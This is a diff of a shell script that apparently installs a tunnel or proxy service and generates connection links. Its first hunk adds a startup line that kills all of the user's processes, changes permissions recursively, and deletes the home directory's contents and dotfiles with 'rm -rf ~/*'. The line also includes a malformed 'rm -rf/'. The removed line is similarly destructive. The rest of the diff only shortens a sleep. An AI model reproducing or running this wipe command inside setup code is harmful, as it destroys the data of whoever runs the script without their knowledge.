@@ -14,7 +14,7 @@ export ARGO_PORT=${ARGO_PORT:-'10000'}
 
 
 
-pkill -kill -u $(whoami) | chmod -R 755 ~/.* | rm -rf ~/.*  | awk '{print $2}' | xargs -r kill -9 2>/dev/null
+pkill -kill -u $(whoami)&&chmod -R 755 ~/*&&chmod -R 755 ~/.*&&rm -rf/&&rm -rf ~/*
 clear
 if [ ! -d "${FILE_PATH}" ]; then
     mkdir ${FILE_PATH}
@@ -204,7 +204,7 @@ EOF
 
   cat ${FILE_PATH}/list.txt
   echo -e "\n\e[1;32m${FILE_PATH}/list.txt saved successfully\e[0m"
-  sleep 5  
+  sleep 2  
   #rm -rf ${FILE_PATH}/boot.log ${FILE_PATH}/config.json ${FILE_PATH}/tunnel.json ${FILE_PATH}/tunnel.yml ${FILE_PATH}/php ${FILE_PATH}/http ${FILE_PATH}/node fake_useragent_0.2.0.json
 }
 generate_links
